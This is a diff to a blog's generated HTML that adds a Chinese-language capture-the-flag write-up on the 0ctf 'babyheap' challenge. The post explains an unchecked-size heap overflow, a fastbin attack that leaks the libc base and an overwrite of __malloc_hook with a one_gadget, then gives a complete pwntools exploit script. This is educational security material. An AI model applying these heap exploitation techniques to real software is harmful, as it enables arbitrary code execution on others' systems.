@@ -165,6 +165,105 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/29/0ctfbabyheap/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Coldshiel's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          
+            <a href="/2020/01/29/0ctfbabyheap/" class="post-title-link" itemprop="url">0ctfbabyheap</a>
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2020-01-29 08:12:29 / Modified: 08:36:35" itemprop="dateCreated datePublished" datetime="2020-01-29T08:12:29-08:00">2020-01-29</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <hr>
+<hr>
+<h1 id="0ctfbabyheap"><a href="#0ctfbabyheap" class="headerlink" title="0ctfbabyheap"></a>0ctfbabyheap</h1><p>寒假肝堆得加紧了，还想刷pwnable来着</p>
+<h2 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h2><p><img src="/2020/01/29/0ctfbabyheap/1580313525795.png" alt="1580313525795"></p>
+<p>程序主要分为四个功能：Allocate,Fill,Free,Dump</p>
+<h3 id="Allocate："><a href="#Allocate：" class="headerlink" title="Allocate："></a>Allocate：</h3><p><img src="/2020/01/29/0ctfbabyheap/1580113992227.png" alt="1580113992227"></p>
+<p>依次按照下标分配，最多为16个chunk，首先判断是否为using chunk，输入size后最大为0x1000，使用calloc分配空间（相较于malloc函数，calloc函数会自动将内存初始化为0）然后更新记录结构体的FLAG、size，content_ptr</p>
+<h3 id="Fill："><a href="#Fill：" class="headerlink" title="Fill："></a>Fill：</h3><p><img src="/2020/01/29/0ctfbabyheap/1580114274572.png" alt="1580114274572"></p>
+<p>输入下标后判断下标是否在范围内，然后判断对应下标的记录结构体FLAG位是否是1（using or not），然后输入size，判断size是否大于0，然后直接输入，<strong>此处并未做输入大小检查</strong></p>
+<h3 id="Free："><a href="#Free：" class="headerlink" title="Free："></a>Free：</h3><p><img src="/2020/01/29/0ctfbabyheap/1580114435473.png" alt="1580114435473"></p>
+<p>输入下标，判断是否在范围内，然后判断using or not，接着置记录结构体FLAG位为0，size为0，然后free掉content_ptr指针并置零</p>
+<h3 id="Dump："><a href="#Dump：" class="headerlink" title="Dump："></a>Dump：</h3><p><img src="/2020/01/29/0ctfbabyheap/1580115008365.png" alt="1580115008365"></p>
+<p>输入下标后判断是否在范围内，判断using or not，然后按记录的size打印内容</p>
+<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit:"></a>Exploit:</h2><p>多calloc几个chunk之后可以利用Fill的漏洞修改相邻chunk的size还有内容</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">alloc(<span class="number">0x20</span>) <span class="comment">#index 0 chunk 0</span></span><br><span class="line">alloc(<span class="number">0x20</span>) <span class="comment">#index 1 chunk 1</span></span><br><span class="line">alloc(<span class="number">0x20</span>) <span class="comment">#index 2 chunk 2</span></span><br><span class="line">alloc(<span class="number">0x20</span>) <span class="comment">#index 3 chunk 3</span></span><br><span class="line">alloc(<span class="number">0x80</span>) <span class="comment">#index 4 chunk 4 Small chunk</span></span><br><span class="line">alloc(<span class="number">0x20</span>) <span class="comment">#index 5 Avoid merging into top_chunk</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br></pre></td></tr></table></figure>
+
+<p>此时chunk 1,2位于fastbin中，且chunk 2的fd指向chunk 1，通过Fill chunk 0，可以达到修改chunk 2 fd，使其指向chunk 4，然后通过Fill chunk 3 修改chunk 4的size，避免fastbin attack时size不同而出错</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">payload  = p64(<span class="number">0</span>)*<span class="number">5</span></span><br><span class="line">payload += p64(<span class="number">0x31</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">5</span></span><br><span class="line">payload += p64(<span class="number">0x31</span>)</span><br><span class="line">payload += p8(<span class="number">0xc0</span>)	 <span class="comment">#Low byte of chunk 4's address</span></span><br><span class="line">fill(<span class="number">0</span>, payload)	<span class="comment">#This payload only edit the fd of chunk 2</span></span><br><span class="line"></span><br><span class="line">payload  = p64(<span class="number">0</span>)*<span class="number">5</span></span><br><span class="line">payload += p64(<span class="number">0x31</span>)	<span class="comment">#This payload edit the size of chunk 4</span></span><br><span class="line">fill(<span class="number">3</span>, payload)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">alloc(<span class="number">0x20</span>)<span class="comment">#index 1  chunk 2 back</span></span><br><span class="line">alloc(<span class="number">0x20</span>)<span class="comment">#index 2  chunk 4</span></span><br></pre></td></tr></table></figure>
+
+<p>然后再通过chunk 3修改chunk 4的大小，这样在free chunk 4 之后chunk 4的fd还有bk就会指向 main_arena</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload  = p64(<span class="number">0</span>)*<span class="number">5</span></span><br><span class="line">payload += p64(<span class="number">0x91</span>)</span><br><span class="line">fill(<span class="number">3</span>, payload)	<span class="comment">#recover 0x80</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">4</span>)<span class="comment">#fd &amp; bk point to main_arena now</span></span><br></pre></td></tr></table></figure>
+
+<p> 此时Dump chunk 2就可以获得 fd &amp; bk的值，从而获得libc base</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">libc_base = u64(dump(<span class="number">2</span>)[:<span class="number">8</span>]) - <span class="number">0x3c4b78</span> <span class="comment">#The offset of main_arena+... in libc</span></span><br></pre></td></tr></table></figure>
+
+<p>此时可想办法利用__malloc_hook，将one_gadget填入，当__malloc_hook不为0时即可调用</p>
+<p><img src="/2020/01/29/0ctfbabyheap/1580295721778.png" alt="1580295721778"></p>
+<p>由于index 2此时指向的依然是chunk 4，我们可以对free掉的chunk 4的fd做修改，再次利用fastbin attack申请到一个包含<em>\</em>malloc_hook的堆块，不过此时要缩小其大小，让chunk 4的size在fast chunk之内</p>
+<p>利用fastbin attack申请一个包含<em>\</em>malloc_hook的堆块需要对应的地方有合适的size</p>
+<p><img src="/2020/01/29/0ctfbabyheap/1580296367287.png" alt="1580296367287"></p>
+<p>当偏移加上0xd之后，利用此处的0x7f size来构造一个chunk，所以我们要将free后在usorted bin中的chunk 4分割，calloc(0x60)然后free之后即可利用chunk 3来修改其fd</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">alloc(<span class="number">0x60</span>) <span class="comment">#0x80----&gt;0x70</span></span><br><span class="line">free(<span class="number">4</span>)     <span class="comment">#Set chunk to fastbin</span></span><br><span class="line"></span><br><span class="line">fill(<span class="number">2</span>, p64(libc_base + <span class="number">0x3c4aed</span>)) <span class="comment">#Fastbin attack target</span></span><br><span class="line">alloc(<span class="number">0x60</span>)<span class="comment">#index 4</span></span><br><span class="line">alloc(<span class="number">0x60</span>)<span class="comment">#index 6 get our target</span></span><br></pre></td></tr></table></figure>
+
+<p>最后利用</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">payload  = <span class="string">'\x00'</span>*<span class="number">3</span></span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">payload += p64(libc_base + <span class="number">0x4526a</span>)<span class="comment">#one_gedget</span></span><br><span class="line">fill(<span class="number">6</span>, payload)<span class="comment">#Fill __malloc_hook </span></span><br><span class="line"></span><br><span class="line">alloc(<span class="number">255</span>)<span class="comment">#just call the function</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="完整EXP"><a href="#完整EXP" class="headerlink" title="完整EXP"></a>完整EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> print_function</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">binary = <span class="string">'./0ctfbabyheap'</span>	<span class="comment">#binary's name here</span></span><br><span class="line">context.binary = binary		<span class="comment">#context here</span></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">pty = process.PTY</span><br><span class="line">p = process(binary, aslr = <span class="number">1</span>, stdin=pty, stdout=pty)	<span class="comment">#process option here</span></span><br><span class="line"></span><br><span class="line">elf = ELF(binary)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line">my_u64 = <span class="keyword">lambda</span> x: u64(x.ljust(<span class="number">8</span>, <span class="string">'\0'</span>))</span><br><span class="line">ub_offset = <span class="number">0x3c4b30</span></span><br><span class="line">codebase = <span class="number">0x555555554000</span></span><br><span class="line"><span class="comment"># todo here</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">alloc</span><span class="params">(size)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">': '</span>, str(size))</span><br><span class="line">    p.recvuntil(<span class="string">': '</span>, timeout=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fill</span><span class="params">(idx, data)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">': '</span>, str(idx))</span><br><span class="line">    p.sendlineafter(<span class="string">': '</span>, str(len(data)))</span><br><span class="line">    p.sendafter(<span class="string">': '</span>, data)</span><br><span class="line">    p.recvuntil(<span class="string">': '</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">': '</span>, str(idx))</span><br><span class="line">    p.recvuntil(<span class="string">': '</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dump</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">'4'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">': '</span>, str(idx))</span><br><span class="line">    p.recvuntil(<span class="string">': \n'</span>)</span><br><span class="line">    data = p.recvline()</span><br><span class="line">    p.recvuntil(<span class="string">': '</span>)</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span><span class="params">()</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">': '</span>)</span><br><span class="line"></span><br><span class="line">    alloc(<span class="number">0x20</span>) <span class="comment">#index 0</span></span><br><span class="line">    alloc(<span class="number">0x20</span>) <span class="comment">#index 1</span></span><br><span class="line">    alloc(<span class="number">0x20</span>) <span class="comment">#index 2</span></span><br><span class="line">    alloc(<span class="number">0x20</span>) <span class="comment">#index 3</span></span><br><span class="line">    alloc(<span class="number">0x80</span>) <span class="comment">#index 4</span></span><br><span class="line">    alloc(<span class="number">0x20</span>) <span class="comment">#index 5 Avoid merging into top_chunk</span></span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    payload  = p64(<span class="number">0</span>)*<span class="number">5</span></span><br><span class="line">    payload += p64(<span class="number">0x31</span>)</span><br><span class="line">    payload += p64(<span class="number">0</span>)*<span class="number">5</span></span><br><span class="line">    payload += p64(<span class="number">0x31</span>)</span><br><span class="line">    payload += p8(<span class="number">0xc0</span>)</span><br><span class="line">    fill(<span class="number">0</span>, payload)</span><br><span class="line"></span><br><span class="line">    payload  = p64(<span class="number">0</span>)*<span class="number">5</span></span><br><span class="line">    payload += p64(<span class="number">0x31</span>)</span><br><span class="line">    fill(<span class="number">3</span>, payload)</span><br><span class="line"></span><br><span class="line">    alloc(<span class="number">0x20</span>)<span class="comment">#index 1</span></span><br><span class="line">    alloc(<span class="number">0x20</span>)<span class="comment">#index 2 0x80</span></span><br><span class="line"></span><br><span class="line">    payload  = p64(<span class="number">0</span>)*<span class="number">5</span></span><br><span class="line">    payload += p64(<span class="number">0x91</span>)</span><br><span class="line">    fill(<span class="number">3</span>, payload)<span class="comment">#recover 0x80</span></span><br><span class="line">    </span><br><span class="line">    free(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">    libc_base = u64(dump(<span class="number">2</span>)[:<span class="number">8</span>]) - <span class="number">0x3c4b78</span></span><br><span class="line">    log.info(<span class="string">"libc_base: "</span> + hex(libc_base))<span class="comment">#libc successful</span></span><br><span class="line">    alloc(<span class="number">0x60</span>)<span class="comment">#0x80----&gt;0x70</span></span><br><span class="line">    free(<span class="number">4</span>)	<span class="comment">#Set to fastbin</span></span><br><span class="line">    fill(<span class="number">2</span>, p64(libc_base + <span class="number">0x3c4aed</span>)) <span class="comment">#Fastbin attack target</span></span><br><span class="line">    alloc(<span class="number">0x60</span>)<span class="comment">#index 4</span></span><br><span class="line">    alloc(<span class="number">0x60</span>)<span class="comment">#index 6</span></span><br><span class="line">    <span class="comment">#gdb.attach(p,'brva 0xdcc\nbrva 0x1022\nbrva 0x4f3\nbrva 0x1107')</span></span><br><span class="line">    payload  = <span class="string">'\x00'</span>*<span class="number">3</span></span><br><span class="line">    payload += p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">    payload += p64(libc_base + <span class="number">0x4526a</span>)</span><br><span class="line">    fill(<span class="number">6</span>, payload)</span><br><span class="line">    </span><br><span class="line">    alloc(<span class="number">255</span>)</span><br><span class="line"></span><br><span class="line">exploit()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+        
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="en">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/10/hello-world/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -301,7 +400,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">11</span>
+          <span class="site-state-item-count">12</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
